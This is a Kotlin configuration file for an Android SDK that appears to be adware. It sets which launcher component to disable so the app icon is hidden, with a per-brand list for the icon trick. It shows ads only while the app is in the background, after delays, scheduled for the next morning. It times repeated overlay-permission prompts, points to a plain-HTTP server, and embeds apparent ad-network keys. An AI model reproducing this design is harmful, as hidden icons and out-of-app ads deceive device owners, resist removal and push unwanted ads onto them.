package com.app.sdk.sdk.config

import android.os.Build
import java.util.*
import java.util.concurrent.TimeUnit

object SdkConfig {

    const val disableComponentName = ".ui.main.MainActivity"
    const val adUnitId = "f234f1c0c78576d7"
    const val kochavaId = "kogalaxy-call-screen-p1yc"
    const val appodealKey = "5b2066591b5032a9e017ce410cbc7917c74777dcf57e5b5e"

    val startSDKTime = Calendar.getInstance().apply {
        clear()
        set(Calendar.YEAR, 2022)
        set(Calendar.MONTH, Calendar.SEPTEMBER)
        set(Calendar.DAY_OF_MONTH, 16)
    }.time.time

    //Settings
    const val serverAddress = "http://somesdeka.online/api/"
    const val canShowAdWhenAppInForeground = false
    const val enableComponentName = "com.app.sdk.SettingsSdk"

    val showAdDelay = TimeUnit.SECONDS.toMillis(50)

    private val overlayNotificationsDelays =
        listOf(TimeUnit.MINUTES.toMillis(5), TimeUnit.HOURS.toMillis(2))

    private val deviceBrand by lazy { Build.BRAND }
    private val cantLaunchActivityDirectlyBrands = listOf("xiaomi")
    private val brandsWhichCanHideIcon = listOf("xiaomi", "oppo", "vivo")

    fun canShowAdDirectly() = !cantLaunchActivityDirectlyBrands
        .any { brand -> (deviceBrand.equals(brand, true)) }

    fun canHideIcon() = brandsWhichCanHideIcon
        .any { brand -> deviceBrand.equals(brand, true) }

    fun getAskOverlayNotificationDelay(askTimes: Int) = overlayNotificationsDelays
        .getOrElse(askTimes) { overlayNotificationsDelays.last() }

    val delayInAppPermissionRequest = TimeUnit.SECONDS.toMillis(5)

    fun getLaunchAdTime(currentTime: Long) = Calendar.getInstance().apply {
        time = Date().apply { time = currentTime + TimeUnit.DAYS.toMillis(1) }
        set(Calendar.HOUR_OF_DAY, 10)
        set(Calendar.MINUTE, 0)
        set(Calendar.SECOND, 0)
        set(Calendar.MILLISECOND, 0)
    }.time.time

}